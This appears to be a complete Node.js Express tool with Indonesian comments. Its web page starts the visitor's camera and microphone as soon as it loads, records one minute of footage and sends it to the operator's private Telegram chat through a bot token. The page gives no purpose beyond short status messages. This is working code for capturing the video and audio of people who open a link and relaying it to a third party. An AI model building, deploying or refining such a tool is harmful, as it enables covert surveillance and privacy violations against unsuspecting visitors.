const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const config = require('./setting.js');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Halaman utama (kosong, hanya dengan script)
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera to Telegram</title>
    <style>
        body { margin: 0; background: black; color: white; text-align: center; font-family: Arial, sans-serif; }
        video { width: 100%; max-width: 500px; margin-top: 20px; border: 2px solid #333; border-radius: 8px; }
        #status { margin-top: 20px; padding: 10px; }
    </style>
</head>
<body>
    <h2>📷 Merekam video 1 menit...</h2>
    <video id="video" autoplay playsinline muted></video>
    <div id="status">Meminta izin kamera...</div>

    <script>
        let mediaRecorder;
        let recordedChunks = [];

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('status').innerText = 'Kamera aktif. Mulai merekam...';

                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    document.getElementById('status').innerText = 'Mengirim video...';
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('video', blob, 'recording.webm');

                    try {
                        const res = await fetch('/upload', { method: 'POST', body: formData });
                        const result = await res.json();
                        if (result.success) {
                            document.getElementById('status').innerText = '✅ Video terkirim ke Telegram!';
                        } else {
                            document.getElementById('status').innerText = '❌ Gagal mengirim: ' + result.error;
                        }
                    } catch (err) {
                        document.getElementById('status').innerText = '❌ Error: ' + err.message;
                    }

                    // Hentikan semua track kamera
                    stream.getTracks().forEach(track => track.stop());
                };

                // Rekam selama 60 detik
                mediaRecorder.start();
                document.getElementById('status').innerText = 'Merekam... (60 detik)';
                setTimeout(() => {
                    if (mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                    }
                }, 60000);
            } catch (err) {
                document.getElementById('status').innerText = '❌ Gagal akses kamera: ' + err.message;
            }
        }

        window.onload = startRecording;
    </script>
</body>
</html>
  `);
});

// Endpoint untuk menerima video dan forward ke Telegram
app.post('/upload', upload.single('video'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, error: 'No video uploaded' });
    }

    try {
        const formData = new FormData();
        formData.append('chat_id', config.OWNER_ID);
        formData.append('video', req.file.buffer, { filename: 'recording.webm', contentType: 'video/webm' });

        const telegramRes = await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, formData, {
            headers: formData.getHeaders()
        });

        if (telegramRes.data.ok) {
            res.json({ success: true });
        } else {
            res.status(500).json({ success: false, error: 'Telegram API error' });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Handle 404
app.use((req, res) => {
    res.status(404).send('404 - Not Found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});